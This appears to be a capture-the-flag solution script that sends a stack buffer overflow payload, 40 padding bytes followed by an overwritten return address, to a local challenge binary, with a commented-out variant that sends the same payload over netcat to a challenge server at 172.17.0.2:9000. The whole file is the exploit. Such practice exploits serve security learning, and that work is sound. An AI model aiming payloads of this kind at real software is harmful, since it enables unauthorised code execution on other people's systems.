#!/bin/sh

perl -e 'print "A" x 40 . "\x06\x12\x40\x00\x00\x00\x00\x00"' | ./dist/chall

#perl -e 'print "A" x 40 . "\x06\x12\x40\x00\x00\x00\x00\x00\n"' | nc 172.17.0.2 9000